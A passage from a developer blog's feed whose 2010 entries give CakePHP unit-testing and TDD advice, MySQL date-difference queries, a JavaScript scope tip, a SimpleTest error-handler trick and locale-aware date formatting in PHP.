You&amp;#39;ll then have to run all your tests and you&amp;#39;ll be able to spot in a matter
of seconds which tests failed, and thus see where a bug occured. Testing this
way is order of magnitude faster than manually testing your app, one page at a
time.&lt;/p&gt;

&lt;p&gt;Before learning what Unit Testing was, I was writing my methods whenever I
needed them and just assumed that they were bugless. Now, I can write a test
to formerly prove that they are. And I can even re-run this same test every
time I refactor my code to see if my refactoring did not broke any previous
behavior.&lt;/p&gt;

&lt;p&gt;The more precise your tests are, the easier it will be for you to debug where
the bug is coming from.&lt;/p&gt;

&lt;h2&gt;And what is Test Driven Development ?&lt;/h2&gt;

&lt;p&gt;TDD is a whole new way of writing code. Instead of writing your method then
write the test for it, you write the test before. You can even write several
tests before, in fact as much as you can think of.&lt;/p&gt;

&lt;p&gt;It forces you to conceptualise (in your head) what you exactly want your
method to do. What inputs should be accepted, what should be returned, what
are the edge cases, what arguments are optional, etc.&lt;/p&gt;

&lt;p&gt;Once you&amp;#39;ve done all this, you just write the tests for each of this things.
Test your method with a specifically formatted input, and check the expected
result. Do that for every edge case you can think of. Then, run the tests. It
will fail, because you haven&amp;#39;t even started writing the method. But that&amp;#39;s ok,
and should I say, that&amp;#39;s the goal.&lt;/p&gt;

&lt;p&gt;Now you have a set of rules, kinda like specs. You know what your method
should do because you&amp;#39;ve written that down with your tests. You can start
writing your method, and you&amp;#39;ll know that you haven&amp;#39;t finished it until all
the tests passes. Thanks to the tests, you&amp;#39;ll know for sure when you&amp;#39;re done
on a specific method.&lt;/p&gt;

&lt;p&gt;Thanks to TDD, you&amp;#39;ll have a precise measure of where you are in the
development cycle. If all your code is test covered and that you only add new
code that is also covered, you can release you app as often as you want.&lt;/p&gt;

&lt;h2&gt;And how is it good for me ?&lt;/h2&gt;

&lt;p&gt;First of all, you will know for sure when you&amp;#39;re done working on a method. If
all the tests passes, you&amp;#39;re good. If at least one test fails, it means that
you can&amp;#39;t still use this method in production because it may have undesirable
side effects.&lt;/p&gt;

&lt;p&gt;it will force you to better think about what you really want to do before
writing anything. I used to rarely take time to stop and think, but instead
rushed into writing code to &amp;quot;make it work&amp;quot;. Now, I&amp;#39;m spending more time with a
pen an paper before, writing down all I want my method to do.&lt;/p&gt;

&lt;p&gt;I didn&amp;#39;t see the benefit of it at first, but I forced myself to do it, and
it&amp;#39;s suprising how fast you can see the benefits. It will allow you to see
more easily edge cases you hadn&amp;#39;t thought of, and prepare yourself in
consequence.&lt;/p&gt;

&lt;h2&gt;But I spend so much time writing tests, while I could be adding new features instead !&lt;/h2&gt;

&lt;p&gt;Yeah, I thougt that too. Writing tests is a chore. It takes a lot of time,
especially if you&amp;#39;ve never wrote any before (but it gets much easier with
practice).&lt;/p&gt;

&lt;p&gt;Writing tests for an existing app is even more difficult. Most of the time,
the code is not easily testable and will need refactoring to allow testing.
While refactoring code just to test it may seem kind of useless (at least
that&amp;#39;s what I thought), the benefits are huge. You only have to write tests
once, and the debug value it offers you will stay forever. Compare this to the
time you&amp;#39;ll have to spend manually debugging a complicated class.&lt;/p&gt;

&lt;p&gt;Tests are also universal and they act as a pretty good documentation. If you
ever work in a team, tests are a great way to make other people understand
what your code is supposed to do. And if someone else needs to edit your code,
they&amp;#39;ll just have to run the tests to see if they break something.&lt;/p&gt;

&lt;p&gt;It is true that writing testable code and corresponding tests takes time. But
it is not true that you could spend this time on new features. If you don&amp;#39;t
write tests for a feature, how could you tell that it&amp;#39;s bugless ? We can just
have your word for it, while when using tests we have a boolean answer to this
question. Tests passes, it works, tests failed, it does not work.&lt;/p&gt;

&lt;p&gt;If you don&amp;#39;t know for sure that a feature is bugless, you&amp;#39;ll never be sure if
a bug won&amp;#39;t appear later and that&amp;#39;s you&amp;#39;ll have to come back and track it
down. Maybe the bug won&amp;#39;t show until one month or two, but you know how hard
it is to debug a two-month old code, even written by yourself.&lt;/p&gt;

&lt;p&gt;With tests, you do yourself a favor, by asserting that you won&amp;#39;t have to get
back to this code later. So yes, it will take longer to write a new feature
with tests, but at least you&amp;#39;ll be able to say &amp;quot;Ok, it&amp;#39;s done, and it&amp;#39;s
working&amp;quot;, while with a feature that hasn&amp;#39;t been tested, you&amp;#39;ll ended up saying
&amp;quot;Ok it&amp;#39;s done, I think it should work. Well, we&amp;#39;ll see...&amp;quot;.&lt;/p&gt;

&lt;h2&gt;You&amp;#39;ve convinced me, I want to start writing tests now.&lt;/h2&gt;

&lt;p&gt;Great !&lt;/p&gt;

&lt;p&gt;First, I discourage you to start and write tests for your whole application
right now. The bigger the app, the faster you&amp;#39;ll be fed up with tests. It&amp;#39;s
much more harder to write tests after, than before. So just write tests for
one class or two at the moment, add new features to your app (using the TDD
approach), and get back to writing tests to the rest of the app later.&lt;/p&gt;

&lt;p&gt;For your firsts tests, you can choose an existing class. I found that models
are the easiest classes to tests. You&amp;#39;ll need fixtures for that, but I won&amp;#39;t
detail it here, the cake documentation is clear enough on the subject. You&amp;#39;ll
also have to create a test case, but again, everything is in the
documentation. If it does not feel clear enough for you, just ask in the
comments and I&amp;#39;ll add a more detailed explanation.&lt;/p&gt;

&lt;p&gt;And now, here are some advices I&amp;#39;ve learned, I thought I could share them with
you :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The number of tests you&amp;#39;ll have to write is not dependent on the number of methods you have in your class. Most of the methods will need several tests, while some rare methods won&amp;#39;t need any. Just write one test for each outcome you want to test. The cake Core tests usually make one test method for each method in the class. I prefer to make several small tests, that way I can more easily spot the part that is failing.&lt;/li&gt;
&lt;li&gt;You can name your test methods the way you want, they just have to start with &lt;code&gt;test&lt;/code&gt;. Do not hesitate to be very specific in the method name. I have methods called &lt;code&gt;test404ErrorIfInvalidUserId&lt;/code&gt; or &lt;code&gt;test404ErrorIfNonExistentuser&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Make calls to &lt;code&gt;App::import()&lt;/code&gt; at the top of your file to load every class you&amp;#39;ll need.&lt;/li&gt;
&lt;li&gt;Use and abuse the &lt;code&gt;startTest&lt;/code&gt;method. This method is called before every test, this is a good way to reset vars to make sure one previous test call will not impact subsequent calls. I got the habit to define a property of the test case as the object I want to test. For example, when testing a model, I&amp;#39;ll write something along the lines of :&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;function startTest() {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$this-&amp;gt;model = ClassRegistry::init(&amp;#39;User&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;Try to refactor you code to split logic into several small methods, each with its own goal and logic. This will be easier to test.&lt;/li&gt;
&lt;li&gt;If you have to test code that relies on an external library and make static calls to it, just wrap the static calls inside a method of your class and mock (see MockObjects) the method.&lt;/li&gt;
&lt;li&gt;You&amp;#39;ll have to create a test case (extending &lt;code&gt;CakeWebTestCase&lt;/code&gt;) to test view generation. This test case will be able to make get (using &lt;code&gt;get()&lt;/code&gt;)queries to your site, and allowing you to test the resulting source code of the page against regular expression using &lt;code&gt;assertPattern()&lt;/code&gt;/&lt;code&gt;assertNoPattern()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;If you have code that rely on &lt;code&gt;exit&lt;/code&gt;, just replace that code to &lt;code&gt;$this-&amp;gt;_stop()&lt;/code&gt;, it&amp;#39;s a method wrapping &lt;code&gt;exit&lt;/code&gt;that was created just to make testing easier. If you have code using &lt;code&gt;die()&lt;/code&gt;, then you&amp;#39;re screwed.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As I&amp;#39;m also still discovering Unit Testing in cake, I&amp;#39;ll surely post other
tips as I encounter them.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Adding some logic in your MySQL</title>
   <link href="http://blog.pixelastic.com/2010/07/23/adding-some-logic-in-your-mysql/"/>
   <updated>2010-07-23T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/07/23/adding-some-logic-in-your-mysql</id>
   <content type="html">&lt;p&gt;I&amp;#39;m not an expert in SQL queries, I just know how to do simple queries and the
more advanced options I&amp;#39;ve ever used are &lt;code&gt;DISTINCT&lt;/code&gt;, &lt;code&gt;HAVING&lt;/code&gt;and &lt;code&gt;GROUP BY&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;For the project I&amp;#39;m working on, I had to add some logic to my SQL queries, to
concatenate various field and compare them.&lt;/p&gt;

&lt;p&gt;Here is, as a reminder, how I&amp;#39;ve managed to I&amp;#39;ve managed to get the time spent
by comparing two dates :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;n&quot;&gt;TIMESTAMPDIFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SECOND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Timestamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EndTimestamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeSpent&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And is practice is never as easy as theory, I didn&amp;#39;t really had a timestamp
but two string fields instead (one &lt;code&gt;date&lt;/code&gt;and one &lt;code&gt;time&lt;/code&gt;), so here&amp;#39;s how I
combined them&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;n&quot;&gt;TIMESTAMPDIFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SECOND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CONCAT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;Timestamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Timestamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CONCAT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;Timestamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Timestamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeSpent&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Javascript speed tip : reduce variable lookup</title>
   <link href="http://blog.pixelastic.com/2010/07/19/javascript-speed-tip-reduce-variable-lookup/"/>
   <updated>2010-07-19T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/07/19/javascript-speed-tip-reduce-variable-lookup</id>
   <content type="html">&lt;p&gt;It appears that, according to this video, when inside a Javascript function
(or closure), if you want to access a variable, the closer your scope is to
this variable, the faster you&amp;#39;ll get it.&lt;/p&gt;

&lt;p&gt;In simpler words, accessing a global variable (like &lt;code&gt;document&lt;/code&gt;, or &lt;code&gt;window&lt;/code&gt;)
from inside a function will always be slower that accessing a locally defined
variable.&lt;/p&gt;

&lt;p&gt;It also means that, when inside a method of an object, accessing a variable
defined in this method will be faster that accessing a property of the parent
object, which itself will be faster that accessing a global variable.&lt;/p&gt;

&lt;p&gt;So, for example, if you need to access at least twice a global variable like
&lt;code&gt;window&lt;/code&gt;or &lt;code&gt;document&lt;/code&gt;in a method, you&amp;#39;d better cache it in a local variable
first.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;function myTestFunction() {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  var button = document.getElementById(&amp;#39;button&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  var header = document.getElementById(&amp;#39;header&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;is bad and could be rewritten as :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;function myTestFunction() {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  var doc = document;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  var button = doc.getElementById(&amp;#39;button&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  var header = doc.getElementById(&amp;#39;header&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Using a fixture with a model using $useTable in cakePHP</title>
   <link href="http://blog.pixelastic.com/2010/07/15/using-a-fixture-with-a-model-using-usetable-in-cakephp/"/>
   <updated>2010-07-15T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/07/15/using-a-fixture-with-a-model-using-usetable-in-cakephp</id>
   <content type="html">&lt;p&gt;It seems that if you&amp;#39;re creating a fixture for a model that uses an
unconventional table name, the &lt;code&gt;CakeTestFixture&lt;/code&gt;does not manage to correctly
create the needed table when your test starts.&lt;/p&gt;

&lt;p&gt;In fact, it will try to insert the fixture records into the right table (the
one defined in &lt;code&gt;$useTable&lt;/code&gt;), but won&amp;#39;t have created the table beforehand.&lt;/p&gt;

&lt;p&gt;In fact this is because it will correctly rely on the model &lt;code&gt;$useTable&lt;/code&gt;
property when inserting records but will try to guess the table name based on
the model name when creating the table.&lt;/p&gt;

&lt;p&gt;Anyway, the quick fix I&amp;#39;ve found so far is to define the &lt;code&gt;$table&lt;/code&gt; property of
your fixture to match your model &lt;code&gt;$useTable&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;class Client extends Model {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  var $useTable = &amp;#39;users&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;class ClientFixture extends CakeTestFixture {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  var $table= &amp;#39;users&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I&amp;#39;ve filed a bug report as well as suggested a fix to allow cake to
automatically use the correct table.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Catching PHP errors with simpleTest</title>
   <link href="http://blog.pixelastic.com/2010/07/15/catching-php-errors-with-simpletest/"/>
   <updated>2010-07-15T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/07/15/catching-php-errors-with-simpletest</id>
   <content type="html">&lt;p&gt;I needed to write a test that should fail if the method I was testing
triggered a PHP &lt;code&gt;E_NOTICE&lt;/code&gt; error (namely, an &amp;quot;&lt;em&gt;undefined index&lt;/em&gt;&amp;quot; kind of
error).&lt;/p&gt;

&lt;p&gt;SimpleTest provides both &lt;code&gt;expectError()&lt;/code&gt; and &lt;code&gt;expectException()&lt;/code&gt; methods. I
have only been able to make the former work with manually triggered errors
(using &lt;code&gt;trigger_error()&lt;/code&gt;), and the latter only catchs Exceptions.&lt;/p&gt;

&lt;p&gt;After hours of googling, and reading SimpleTest source code, I finally managed
to come up with a solution.&lt;/p&gt;

&lt;h2&gt;Redefining the error handler&lt;/h2&gt;

&lt;p&gt;It still amaze me how awfuly complicated it is to do such a simple thing.
Anyway, the key is to redefine the error handler function so you can
shortcircuit both PHP and SimpleTest on the way they managed errors.&lt;/p&gt;

&lt;p&gt;Doing so you can detect when the code you test produce an error. Based on the
&lt;code&gt;$errno&lt;/code&gt; and &lt;code&gt;$errstr&lt;/code&gt; supplied, you can even filter to exactly the error
you&amp;#39;re looking for.&lt;/p&gt;

&lt;p&gt;Unfortunatly, you&amp;#39;ll be blocked inside your newly defined &lt;code&gt;error_handler&lt;/code&gt;
function. It means you won&amp;#39;t have access to the test, so won&amp;#39;t be able to call
&lt;code&gt;$this-&amp;gt;pass()&lt;/code&gt; nor &lt;code&gt;$this-&amp;gt;fail()&lt;/code&gt;, because &lt;code&gt;$this&lt;/code&gt; does not reference
anything.&lt;/p&gt;

&lt;h2&gt;Throw me out of here&lt;/h2&gt;

&lt;p&gt;The only trick I&amp;#39;ve found to get out of this function and back in the scope of
your test is to throw an Exception. Namely, an &lt;code&gt;ErrorException&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Doing so we can rewrote our test to put the part that is triggering the error
inside a &lt;code&gt;try&lt;/code&gt;/ &lt;code&gt;catch&lt;/code&gt;statement and manually pass or fail the test.&lt;/p&gt;

&lt;h2&gt;Don&amp;#39;t you forget something ?&lt;/h2&gt;

&lt;p&gt;One &lt;strong&gt;very&lt;/strong&gt; important thing not to forget here is to restore the
&lt;code&gt;error_handler&lt;/code&gt; to its original value once you won&amp;#39;t need it. If you don&amp;#39;t,
you will surely broke all your subsequent tests because SimpleTest use its own
&lt;code&gt;error_handler&lt;/code&gt; too.&lt;/p&gt;

&lt;p&gt;We have to restore it in two places, both when the code triggered and error /
throw an exception and when it don&amp;#39;t.&lt;/p&gt;

&lt;h2&gt;Cut the speech, show me the code&lt;/h2&gt;

&lt;p&gt;Okay, here&amp;#39;s the code. Don&amp;#39;t forget to adapt the condition in the
&lt;code&gt;error_handler&lt;/code&gt; to match your error.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;function testGotUndefinedIndex() {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    // Overriding the error handler&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    function errorHandlerCatchUndefinedIndex($errno, $errstr, $errfile, $errline ) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        // We are only interested in one kind of error&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        if ($errstr==&amp;#39;Undefined index: bar&amp;#39;) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;            //We throw an exception that will be catched in the test&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;            throw new ErrorException($errstr, 0, $errno, $errfile, $errline);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        return false;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    set_error_handler(&amp;quot;errorHandlerCatchUndefinedIndex&amp;quot;);&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;    try {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        // triggering the error&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        $foo = array();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        echo $foo[&amp;#39;bar&amp;#39;];&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    } catch (ErrorException $e) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        // Very important : restoring the previous error handler&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        restore_error_handler();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        // Manually asserting that the test fails&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        $this-&amp;gt;fail();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        return;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    }&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;    // Very important : restoring the previous error handler&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    restore_error_handler();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    // Manually asserting that the test succeed&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $this-&amp;gt;pass();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>cakePHP testing tip : Creating or edit a datasource on the fly</title>
   <link href="http://blog.pixelastic.com/2010/07/13/cakephp-testing-tip-creating-or-edit-a-datasource-on-the-fly/"/>
   <updated>2010-07-13T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/07/13/cakephp-testing-tip-creating-or-edit-a-datasource-on-the-fly</id>
   <content type="html">&lt;p&gt;For one of the tests I&amp;#39;m currently writing, I needed to assert that my method
was correctly returning an error if the connection to the database was
impossible.&lt;/p&gt;

&lt;p&gt;I couldn&amp;#39;t find an easy way to change datasource credentials once the app was
initiated, so I decided to manually update the &lt;code&gt;ConnectionManager&lt;/code&gt; inner
values.&lt;/p&gt;

&lt;p&gt;Here&amp;#39;s how I did it :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;// Getting the datasource cache in the ConnectionManager object&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$connectionManagerInstance = ConnectionManager::getInstance();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$databaseConfig = &amp;amp;$connectionManagerInstance-&amp;gt;_dataSources;&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;// Saving the initial setting for reverting it later&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$_defaultConfig = $databaseConfig[&amp;#39;default&amp;#39;];&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;// Changing the password so the credentials will fail&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$databaseConfig[&amp;#39;default&amp;#39;]-&amp;gt;config[&amp;#39;password&amp;#39;].= &amp;#39;pass&amp;#39;;&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;// Getting the updated datasource&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$connect = ConnectionManager::getDataSource(&amp;#39;default&amp;#39;);&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;// Error handling when connection unavailable&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;[...]&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;// And reverting the settings back&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$databaseConfig[&amp;#39;default&amp;#39;] = $_defaultConfig;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This proved really useful when testing to simulate a database server error.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Displaying a date in the correct locale with cakePHP</title>
   <link href="http://blog.pixelastic.com/2010/07/05/displaying-a-date-in-the-correct-locale-with-cakephp/"/>
   <updated>2010-07-05T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/07/05/displaying-a-date-in-the-correct-locale-with-cakephp</id>
   <content type="html">&lt;p&gt;The easiest way to display a date in a given format is to use a combination of
&lt;code&gt;strftime()&lt;/code&gt; and &lt;code&gt;strtotime()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Sometimes, you also need your date to be displayed in a specific language. For
example, for a french website, I needed a date to be displayed as &amp;quot;&lt;em&gt;mardi 03
aoÃ»t 2010&lt;/em&gt;&amp;quot; instead of &amp;quot;&lt;em&gt;Wednesday, August 3rd&lt;/em&gt;&amp;quot;.&lt;/p&gt;

&lt;h2&gt;Setting the locale&lt;/h2&gt;

&lt;p&gt;To achieve that, you just have to tell PHP which locale to use when displaying
date with &lt;code&gt;setlocale(LC_TIME, $locale)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The value of &lt;code&gt;$locale&lt;/code&gt; is OS dependent, though. For example, on a linux
server, you have to set &lt;code&gt;fr_FR&lt;/code&gt; while it is &lt;code&gt;fr&lt;/code&gt; or even &lt;code&gt;french&lt;/code&gt;on Windows.&lt;/p&gt;

&lt;p&gt;Fortunatly, you can pass an array of locales to &lt;code&gt;setlocale&lt;/code&gt;(, and the system
will use the first one it can find. You just have to pass an array containing
all possible values and you&amp;#39;ll be good to go.&lt;/p&gt;

&lt;p&gt;I wrote a little method that use the &lt;code&gt;L10n&lt;/code&gt;object that comes with cakePHP to
automate the creation of such an array. Just feed him a 3-letter language code
and it will return an array of the most common locale names.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;function getLocales($lang) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;// Loading the L10n object&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;App::import(&amp;#39;L10n&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$l10n = new L10n();&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;// Iso2 lang code&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$iso2 = $l10n-&amp;gt;map($lang);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$catalog = $l10n-&amp;gt;catalog($lang);&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;$locales = array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $iso2.&amp;#39;_&amp;#39;.strtoupper($iso2).&amp;#39;.&amp;#39;.strtoupper(str_replace(&amp;#39;-&amp;#39;, &amp;#39;&amp;#39;, $catalog[&amp;#39;charset&amp;#39;])),Â Â Â  // fr_FR.UTF8&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $iso2.&amp;#39;_&amp;#39;.strtoupper($iso2),Â Â Â  // fr_FR&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $catalog[&amp;#39;locale&amp;#39;],Â Â Â  Â Â Â  Â Â Â  Â // fre&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $catalog[&amp;#39;localeFallback&amp;#39;],Â Â Â  Â // fre&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $iso2Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â // fr&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  );&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;return $locales;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You may note that I set in first position a locale with the mention of the
encoding. This is only used on Linux machines, Windows does not handle that.
That&amp;#39;s a pity, but I&amp;#39;ll show you how to correctly make it work underWwindows.&lt;/p&gt;

&lt;p&gt;As a side note, &lt;code&gt;setlocale&lt;/code&gt; will not &lt;code&gt;return false&lt;/code&gt; if the locale is not
found, it will just fail to load it.&lt;/p&gt;

&lt;h2&gt;Displaying date in UTF8&lt;/h2&gt;

&lt;p&gt;If your app is in UTF8 (and it should be !) you may run into problem when
trying to display a simple &lt;code&gt;strftime(&amp;quot;%B&amp;quot;, strtotime($date))&lt;/code&gt; on Windows.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;%B&lt;/code&gt; translate to the current month name. For a month like &lt;em&gt;AoÃ»t&lt;/em&gt; (&lt;em&gt;August&lt;/em&gt;)
the funny &lt;em&gt;Ã»&lt;/em&gt; will not get correctly displayed, because Windows does its
locale translation in its native encoding.&lt;/p&gt;

&lt;p&gt;You&amp;#39;ll need to manually encode it in utf8, but if you do so on a linux
machine, as the result is already encoded in utf8 you may end in double
encoding the same string, resulting in others display errors.&lt;/p&gt;

&lt;p&gt;Note also that if your format string itself contains utf8 encoded characters
